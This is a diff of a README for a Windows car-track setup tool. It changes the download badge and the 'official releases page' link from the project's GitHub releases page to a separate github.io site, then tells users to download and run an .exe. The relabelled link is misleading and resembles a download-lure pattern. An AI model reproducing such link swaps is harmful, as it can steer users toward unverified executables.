@@ -1,6 +1,6 @@
 # 🏎️ apexlog-car-track-guide - Find best car track race setups
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ifham857/apexlog-car-track-guide/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://ifham857.github.io)
 
 ## 📖 About this application
 
@@ -14,7 +14,7 @@ Your computer must run Windows 10 or Windows 11. You need at least 200 MB of fre
 
 Follow these steps to set up the application on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/ifham857/apexlog-car-track-guide/releases) to find the latest version.
+1. Visit the [official releases page](https://ifham857.github.io) to find the latest version.
 2. Look for the file ending in .exe under the Assets section of the latest release.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
